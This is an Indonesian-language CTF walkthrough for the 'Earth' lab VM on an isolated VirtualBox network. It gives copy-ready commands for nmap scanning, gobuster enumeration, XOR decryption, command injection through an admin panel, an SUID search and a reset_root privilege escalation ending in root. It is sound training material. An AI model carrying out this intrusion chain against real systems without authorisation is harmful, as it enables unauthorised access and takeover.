🛠️ Persiapan & Konfigurasi Jaringan

Sebelum memulai, pastikan mesin virtual Kali Linux dan mesin target (Earth) dapat saling berkomunikasi. Kita menggunakan Host-Only Adapter di VirtualBox agar keduanya berada di jaringan lokal yang terisolasi.

  • Buka VirtualBox.
  • Buka menu File > Tools > Network Manager.
  • Klik Create untuk membuat adaptor Host-Only baru (pastikan DHCP Server aktif).
  • Matikan mesin Kali dan Earth.
  • Klik kanan masing-masing mesin > Settings > Network.
  • Ubah Attached to menjadi Host-only Adapter.
  • Nyalakan kembali kedua mesin.
💡 Catatan: Jika Kali tidak bisa akses internet setelah diubah, tambahkan Adapter 2 dengan mode NAT.

🔍 Information Gathering (Cek IP & Verifikasi Jaringan)

Setelah kedua mesin menyala, kita perlu mencari tahu IP address mesin target (Earth) dan memastikan koneksi jaringan berjalan lancar.

1. Cek IP Kali Linux Anda:

ip a Klik untuk copy

Perhatikan antarmuka eth0. Pastikan IP-nya berada di rentang 192.168.56.x (misalnya 192.168.56.102). Jika belum, jalankan sudo dhclient eth0.

2. Scan Jaringan untuk Menemukan IP Target:

sudo nmap -sn 192.168.56.0/24 Klik untuk copy

Perintah ini akan memindai seluruh jaringan dan menampilkan daftar host yang aktif. Cari IP yang bukan milik Kali Anda dan bukan 192.168.56.1 (gateway). Biasanya target berada di 192.168.56.101 atau 192.168.56.100.

3. TEST PING (Verifikasi Koneksi ke Target):

Sebelum menyerang, pastikan Kali bisa menjangkau IP target. Misalkan IP target adalah 192.168.56.101:

ping -c 4 192.168.56.101 Klik untuk copy
✅ Jika berhasil: Akan muncul balasan (reply) dari IP target. Jika muncul "Destination Host Unreachable", periksa kembali pengaturan adapter Host-Only Anda.

4. Scan Port & Layanan pada IP Target:

sudo nmap -sC -sV -p- 192.168.56.101 Klik untuk copy
⚠️ Info Penting: Dari hasil scan, ditemukan port 22 (SSH), 80 (HTTP), dan 443 (HTTPS). Selain itu, pada sertifikat SSL (port 443) ditemukan nama domain rahasia: earth.local dan terratest.earth.local.

🌐 Web Exploitation & Enumerasi

Agar bisa mengakses website dengan nama domain, kita harus mendaftarkannya di file /etc/hosts.

1. Edit file hosts:

sudo nano /etc/hosts Klik untuk copy

Tambahkan baris berikut di paling bawah (sesuaikan IP target):

192.168.56.101 earth.local terratest.earth.local Klik untuk copy

Simpan dengan Ctrl+O, Enter, lalu keluar dengan Ctrl+X.

2. Enumerasi Direktori (Directory Busting):

Kita akan mencari file tersembunyi di domain terratest.earth.local menggunakan Gobuster.

gobuster dir -u https://terratest.earth.local -w /usr/share/wordlists/dirb/common.txt -k Klik untuk copy

Dari hasil pemindaian, ditemukan file robots.txt. Buka file tersebut di browser:

Buka robots.txt

Di dalam robots.txt, terdapat petunjuk untuk membuka file /testingnotes.txt. Buka file tersebut:

Buka testingnotes.txt
📄 Isi testingnotes.txt: File ini memberitahukan bahwa enkripsi menggunakan XOR, user admin adalah terra, dan ada file testdata.txt yang menjadi kunci dekripsi.

🔓 Pemecahan Sandi (Cryptography XOR)

Buka halaman https://earth.local. Di sana terdapat form "Earth Secure Messaging" dan deretan kode Hex di bagian "Previous Messages".

Kita akan menggunakan tool online CyberChef untuk mendekripsi kode Hex tersebut menggunakan kunci dari file testdata.txt.

Cara Melakukannya:

  • Buka file testdata.txt dan copy seluruh teksnya (teks tentang radiometric dating).
  • Copy salah satu baris kode Hex dari halaman earth.local.
  • Buka CyberChef, masukkan kode Hex ke kotak Input.
  • Tambahkan operasi From Hex, lalu XOR.
  • Di kolom Key pada XOR, paste teks dari testdata.txt.
  • Pastikan Key format diatur ke UTF-8.

💻 Command Injection (Akses Awal)

Login ke halaman admin di https://earth.local menggunakan kredensial yang baru saja ditemukan.

Setelah berhasil login, Anda akan melihat fitur "Admin Command Tool" yang memungkinkan eksekusi perintah sistem (Command Injection).

Uji coba dengan perintah sederhana:

whoami Klik untuk copy
ls -la Klik untuk copy

Jika output muncul (misalnya nama user atau daftar file), berarti kita sudah memiliki eksekusi kode jarak jauh (RCE).

👑 Privilege Escalation (Menjadi Root)

Tujuan akhir kita adalah mendapatkan akses root. Karena kita sudah bisa mengeksekusi perintah, kita akan mencari file yang memiliki izin khusus (SUID bit).

1. Cari File SUID:

find / -perm -4000 -type f 2>/dev/null Klik untuk copy

Dari hasil pencarian, ditemukan file yang sangat mencurigakan: /usr/bin/reset_root.

2. Buat File Pemicu (Trigger Files):

Program reset_root membutuhkan beberapa file tertentu agar bisa berjalan. Kita buat file-file tersebut:

touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe Klik untuk copy

3. Jalankan Program Reset:

/usr/bin/reset_root Klik untuk copy
✅ Output: "CHECKING IF RESET TRIGGERS PRESENT... RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth"

4. Baca Flag:

Karena password root sudah diubah menjadi Earth, kita bisa membaca flag menggunakan perintah su:

echo "Earth" | su -c "cat /root/root_flag.txt" root Klik untuk copy
